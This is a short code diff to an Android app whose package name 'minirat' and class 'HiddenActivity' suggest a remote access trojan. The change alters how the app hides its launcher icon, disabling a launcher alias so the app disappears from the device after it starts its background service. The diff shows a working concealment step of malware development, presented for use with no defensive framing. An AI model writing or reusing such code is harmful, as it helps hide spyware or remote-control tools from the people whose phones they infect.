@@ -2,6 +2,7 @@ package com.app.minirat;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
@@ -79,9 +80,10 @@ public class HiddenActivity extends Activity {
             startService(serviceIntent);
         }
 
-        // Hide app from launcher/app drawer after first launch
+        // Hide app icon by disabling the launcher alias
+        ComponentName alias = new ComponentName(this, "com.app.minirat.LauncherAlias");
         getPackageManager().setComponentEnabledSetting(
-                getComponentName(),
+                alias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
         );
